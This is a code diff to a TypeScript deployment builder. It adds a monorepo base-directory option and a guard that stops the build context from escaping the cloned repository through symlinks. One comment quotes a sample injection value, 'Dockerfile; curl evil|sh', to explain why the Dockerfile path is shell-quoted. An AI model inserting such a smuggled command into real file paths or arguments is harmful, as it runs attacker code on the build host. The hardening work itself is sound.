@@ -46,6 +46,7 @@ export interface AppSpec {
   gitBranch?: string | null;
   buildType?: BuildKind;
   dockerfilePath?: string | null;
+  baseDirectory?: string | null; // GIT monorepo: build context/root = `${bd}/${baseDirectory}`; null → repo root
   buildCommand?: string | null;
   outputDir?: string | null;
   composeFile?: string | null;
@@ -570,6 +571,11 @@ function prepSteps(app: AppSpec, version: string, noCache = false): string[] {
     : "";
   if (app.source === "GIT") {
     const bd = `/etc/tugra/builds/${app.id}`;
+    // Monorepo: the repo is still cloned WHOLE into `bd` (clone / rm / commit-markers stay on the repo root);
+    // only the build CONTEXT and the builder ROOT move to the subdirectory. `baseDirectory` is validated by
+    // BASE_DIR (no leading `/`, no `..`, charset bars spaces/metachars), so it is safe unquoted — and when it
+    // is null `base === bd`, keeping every build command byte-identical to the pre-monorepo output.
+    const base = app.baseDirectory ? `${bd}/${app.baseDirectory}` : bd;
     const branch = app.gitBranch || "main";
     const url = app.gitUrl ?? "";
     const ssh = isSshGitUrl(url);
@@ -613,30 +619,43 @@ function prepSteps(app: AppSpec, version: string, noCache = false): string[] {
       `TUGRA_CM=$(git -C ${bd} log -1 --format=%s 2>/dev/null | head -c 300 | base64 | tr -d '\\n' || true)`,
       `echo "TUGRA_COMMIT_MSG_B64=$TUGRA_CM"`,
     );
+    if (app.baseDirectory) {
+      // The clone is untrusted: a `baseDirectory` like `apps/api` could be a symlink to `/` or `/etc`, which
+      // docker/nixpacks would then use as the build context and `COPY . .` would bake host files into the
+      // image. The BASE_DIR regex can't catch a symlink, so resolve both paths (`pwd -P`, POSIX — no realpath
+      // on slim agents) and hard-fail unless the base stays inside the clone. A missing dir fails too (never
+      // silently fall back to the repo root and deploy the wrong code).
+      steps.push(
+        `TUGRA_BD=$(cd ${bd} && pwd -P)`,
+        `TUGRA_BASE=$(cd ${shq(base)} 2>/dev/null && pwd -P) || { echo "TUGRA: base directory not found in the repository"; exit 1; }`,
+        `case "$TUGRA_BASE/" in "$TUGRA_BD"/*) ;; *) echo "TUGRA: base directory resolves outside the repository"; exit 1;; esac`,
+      );
+    }
     if (app.buildType === "DOCKERFILE") {
       // shq the -f path: dockerfilePath is caller/importer-supplied; unquoted it was a host-root shell
       // injection (e.g. `Dockerfile; curl evil|sh`). The `--` before each clone URL likewise stops a
-      // URL that begins with `-` from being parsed as a git option.
+      // URL that begins with `-` from being parsed as a git option. The path is relative to `base` (the
+      // monorepo subdirectory, or the repo root when no base is set).
       const df = app.dockerfilePath || "Dockerfile";
-      steps.push(`docker build ${nc}${buildArgFlags}-t ${tag} -f ${shq(`${bd}/${df}`)} ${bd}`);
+      steps.push(`docker build ${nc}${buildArgFlags}-t ${tag} -f ${shq(`${base}/${df}`)} ${base}`);
     } else if (app.buildType === "STATIC") {
       // Generate an nginx (+ optional node build stage) Dockerfile and config.
       steps.push(
-        `printf %s ${shq(b64(staticDockerfile(app.buildCommand, app.outputDir)))} | base64 -d > ${bd}/Dockerfile.tugra`,
-        `printf %s ${shq(b64(staticNginxConf()))} | base64 -d > ${bd}/tugra-nginx.conf`,
-        `docker build ${nc}${buildArgFlags}-t ${tag} -f ${bd}/Dockerfile.tugra ${bd}`,
+        `printf %s ${shq(b64(staticDockerfile(app.buildCommand, app.outputDir)))} | base64 -d > ${base}/Dockerfile.tugra`,
+        `printf %s ${shq(b64(staticNginxConf()))} | base64 -d > ${base}/tugra-nginx.conf`,
+        `docker build ${nc}${buildArgFlags}-t ${tag} -f ${base}/Dockerfile.tugra ${base}`,
       );
     } else if (app.buildType === "RAILPACK") {
       // Railpack (Railway's modern builder) — builds an OCI image via BuildKit.
       steps.push(
         "command -v railpack >/dev/null 2>&1 || curl -sSL https://railpack.com/install.sh | sh",
-        `railpack build ${bd} --name ${tag}${buildEnvFlags}`,
+        `railpack build ${base} --name ${tag}${buildEnvFlags}`,
       );
     } else if (app.buildType === "HEROKU") {
       // Heroku / Cloud Native Buildpacks via the pack CLI.
       steps.push(
         "command -v pack >/dev/null 2>&1 || { curl -sSL https://github.com/buildpacks/pack/releases/download/v0.36.0/pack-v0.36.0-linux.tgz | tar -C /usr/local/bin -xz pack; }",
-        `pack build ${tag} --path ${bd} --builder heroku/builder:24 --pull-policy if-not-present${buildEnvFlags}`,
+        `pack build ${tag} --path ${base} --builder heroku/builder:24 --pull-policy if-not-present${buildEnvFlags}`,
       );
     } else {
       // Nixpacks: materialise the build plan first so we can (a) inject curl/wget into the
@@ -649,13 +668,13 @@ function prepSteps(app: AppSpec, version: string, noCache = false): string[] {
       const plan = `/etc/tugra/builds/${app.id}.plan.json`;
       steps.push(
         "command -v nixpacks >/dev/null 2>&1 || curl -sSL https://nixpacks.com/install.sh | bash",
-        `nixpacks plan -f json${buildEnvFlags} ${bd} > ${plan}`,
+        `nixpacks plan -f json${buildEnvFlags} ${base} > ${plan}`,
         "if command -v jq >/dev/null 2>&1; then",
         `  jq '.phases.setup.aptPkgs = ((.phases.setup.aptPkgs // []) + ["curl","wget"] | unique)' ${plan} > ${plan}.tmp && mv ${plan}.tmp ${plan}`,
         "else",
         '  echo "TUGRA: jq not found — skipping curl/wget health-tool injection into the Nixpacks plan" >&2',
         "fi",
-        `nixpacks build -c ${plan} --cache-key ${shq(app.id)} --name ${tag}${buildEnvFlags} ${bd}`,
+        `nixpacks build -c ${plan} --cache-key ${shq(app.id)} --name ${tag}${buildEnvFlags} ${base}`,
         `rm -f ${plan} ${plan}.tmp`,
       );
     }
